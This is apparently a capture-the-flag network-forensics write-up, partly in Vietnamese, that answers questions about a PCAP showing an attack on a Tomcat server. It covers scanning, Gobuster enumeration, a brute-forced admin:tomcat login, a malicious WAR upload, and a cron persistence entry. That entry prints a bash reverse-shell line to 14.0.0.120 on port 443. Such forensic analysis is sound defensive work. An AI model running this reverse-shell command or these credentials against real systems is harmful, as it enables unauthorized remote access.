Q1 : Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. 
Can you identify the source IP address responsible for initiating these requests on our server?
- Vào Conversations ta thấy IP 14.0.0.120 đang thực hiện scan và gửi hàng loạt yêu cầu đến máy chủ :
  <img width="1127" height="675" alt="image" src="https://github.com/user-attachments/assets/9ca201e2-f709-45da-b812-5fa6bc54815d" />

Q2 : Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?
- Tìm IP 14.0.0.120 ta có được địa chỉ của kẻ tấn công là ở CHINA

Q3 : From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?
- Dùng Display Filter :ip.src == 14.0.0.120 && http.
- Vậy là kẻ tấn công đã truy cập vào cổng 8080 :
<img width="955" height="373" alt="image" src="https://github.com/user-attachments/assets/5d473e45-62ba-4837-8ecb-89d88fc9cfd2" />


Q4 : Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server.
Which tools can you identify from the analysis that assisted the attacker in this enumeration process?

- Truy cập vào các gói tin ta thấy kẻ tấn công đã sử dụng : Gobuster
<img width="952" height="374" alt="image" src="https://github.com/user-attachments/assets/efde0f8a-561a-4861-a739-98ff591e67f8" />

Q5 : After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. 
Which specific directory related to the admin panel did the attacker uncover?

- Ta kiểm tra các gói tin được tải thành công bằng : http && http.response.code==200
- Ta thấy gói GET /manager được trả về 302 Found nghĩa là kẻ tấn công đã tấn công và truy cập vào /manager :
<img width="1277" height="910" alt="image" src="https://github.com/user-attachments/assets/ee6e2403-0dd7-486a-8694-943681ad220b" />

Q6 : After accessing the admin panel, the attacker tried to brute-force the login credentials. 
Can you determine the correct username and password that the attacker successfully used for login?

- Ta sử dụng bộ lọc : http.authbasic để hiển thị các gói HTTP có sử dụng Basic Authentication.
- Truy cập gói POST ta thấy Authorization: Basic YWRtaW46dG9tY2F0 và trả về kết quả đúng 200 OK
<img width="1239" height="587" alt="image" src="https://github.com/user-attachments/assets/4c01b443-c770-4abc-9296-7510ea9a4db5" />

- Decode Base64 :YWRtaW46dG9tY2F0 . Ta được : admin:tomcat
<img width="721" height="578" alt="image" src="https://github.com/user-attachments/assets/ea690e15-504a-481b-bec4-656eded236c7" />


Q7: Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. 
Can you identify the name of this malicious file from the captured data?
- Ta sử dụng lọc : ip.src == 14.0.0.120 && http.request.method == "POST" và thấy kẻ tấn công đã tải lên : JXQOZY.war
<img width="1273" height="1026" alt="image" src="https://github.com/user-attachments/assets/749b56ff-0348-4656-8a65-56d83b11e881" />

Q8 : After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. 
From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?

- Sử dụng bộ lọc : ip.src == 14.0.0.120 && tcp.flags == 0x012 để xác định các gói TCP có cờ SYN-ACK do IP 14.0.0.120 gửi ra
<img width="1518" height="575" alt="image" src="https://github.com/user-attachments/assets/acf4f576-02ec-4c09-87c9-bbe3fb34aefa" />

 - Ta có thể thấy sau truy cập kẻ tấn công đã sử dụng :* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'

 - Cron job này thiết lập một reverse shell duy trì bằng cách khởi tạo kết nối TCP đi ra tới địa chỉ 14.0.0.120 trên cổng 443 mỗi phút,
cho phép kẻ tấn công duy trì quyền thực thi lệnh từ xa trên hệ thống.
